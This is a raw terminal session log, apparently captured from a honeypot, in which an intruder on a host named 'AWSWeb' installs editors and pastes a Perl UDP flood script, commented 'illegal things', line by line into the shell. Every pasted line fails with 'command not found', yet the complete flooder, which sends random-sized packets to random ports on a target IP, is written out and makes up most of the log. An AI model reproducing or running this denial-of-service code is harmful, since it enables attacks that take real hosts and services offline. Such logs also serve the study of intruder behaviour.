[4hAWSWeb:~# nano
bash: nano: command not found
AWSWeb:~# apt-get on[1D[1P[1D[1Pinstall nano
[4lReading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  nano 
0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
Need to get 635.2kB of archives.
After this operation, 1397.0kB of additional disk space will be used.
Get:1 http://ftp.debian.org stable/main nano 1.27-2 [635.2kB]
Fetched 635.2kB in 1s (4493B/s)
Reading package fields... Done
perl;Reading package status... Done
(Reading database ... 177887 files and directories currently installed.)
[1D[1PUnpacking nano (from .../archives/nano_1.27-2_i386.deb) ...
Processing triggers for man-db ...
Setting up nano (1.27-2) ...
[4hAWSWeb:~# perl
bash: perlperl: command not found
AWSWeb:~# 
AWSWeb:~# perl
bash: perl: command not found
AWSWeb:~# apt-[1D[1P[1D[1P[1D[1P[1D[1Pabotu[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano
[4lnano: Segmentation fault
[4hAWSWeb:~# su nanio[1D[1P[1D[1Po
[4l[4hAWSWeb:~# su nano dos.pl
[4l[4hAWSWeb:~# #!/usr/bin/perl
bash: #!/usr/bin/perl: command not found
AWSWeb:~# 
AWSWeb:~# ##############
bash: ##############: command not found
AWSWeb:~# # illegal things.
bash: #: command not found
AWSWeb:~# ##############
bash: ##############: command not found
AWSWeb:~# 
AWSWeb:~# use Socket;
bash: use: command not found
AWSWeb:~# use strict;
bash: use: command not found
AWSWeb:~# 
AWSWeb:~# my ($ip,$port,$size,$time) = @ARGV;
bash: my: command not found
AWSWeb:~# 
AWSWeb:~# my ($iaddr,$endtime,$psize,$pport);
bash: my: command not found
AWSWeb:~# 
AWSWeb:~# $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
bash: $iaddr: command not found
AWSWeb:~# $endtime = time() + ($time ? $time : 1000000);
bash: $endtime: command not found
AWSWeb:~# socket(flood, PF_INET, SOCK_DGRAM, 17);
bash: socket(flood,: command not found
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# print "Flooding $ip " . ($port ? $port : "random") . " port with " .
bash: print: command not found
AWSWeb:~#   ($size ? "$size-byte" : "random size") . " packets" .
bash: ($size: command not found
AWSWeb:~#   ($time ? " for $time seconds" : "") . "\n";
bash: ($time: command not found
AWSWeb:~# print "Break with Ctrl-C\n" unless $time;
bash: print: command not found
AWSWeb:~# 
AWSWeb:~# for (;time() <= $endtime;) {
bash: for: command not found
bash: time(): command not found
bash: ): command not found
AWSWeb:~#   $psize = $size ? $size : int(rand(1024-64)+64) ;
bash: $psize: command not found
AWSWeb:~#   $pport = $port ? $port : int(rand(65500))+1;
bash: $pport: command not found
AWSWeb:~# 
AWSWeb:~#   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
bash: send(flood,: command not found
bash: }: command not found
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# 
AWSWeb:~# aptg[1D[1P-get install gedit
[4lReading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  gedit 
0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
Need to get 322.2kB of archives.
After this operation, 708.4kB of additional disk space will be used.
Get:1 http://ftp.debian.org stable/main gedit 0.9-4 [322.2kB]
tyFetched 322.2kB in 1s (4493B/s)
Reading package fields... Done
Reading package status... Done
(Reading database ... 177887 files and directories currently installed.)
Unpacking gedit (from .../archives/gedit_0.9-4_i386.deb) ...
